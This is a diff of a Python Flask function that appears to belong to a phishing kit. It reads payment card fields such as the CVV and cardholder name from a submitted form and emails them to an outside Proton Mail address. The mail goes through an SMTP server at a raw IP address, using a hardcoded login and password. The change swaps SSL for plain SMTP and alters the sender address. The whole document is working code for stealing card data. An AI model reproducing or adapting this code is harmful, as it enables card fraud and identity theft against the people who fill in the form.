@@ -151,6 +151,7 @@ def first():
         cvv = request.form.get("cvv")
         cardholdername =  request.form.get("cardHolderName")
         sender_email = "contact"
+	sender_emailaa = "contact@personalbio.site"
         receiver_email = "Sealer2024@proton.me"
         password = "vip79d01760b097"
         useragent = request.headers.get('User-Agent')
@@ -168,9 +169,9 @@ def first():
         part2 = MIMEText(html, "html")
         message.attach(part1)
         message.attach(part2)
-        with smtplib.SMTP_SSL("91.217.246.43", 6040) as server:
+        with smtplib.SMTP("91.217.246.43", 6040) as server:
             server.login(sender_email, password)
-            server.sendmail(sender_email, receiver_email, message.as_string())
+            server.sendmail(sender_emailaa, receiver_email, message.as_string())
         return redirect(url_for('benza', web=session.get('eman')))
 
 
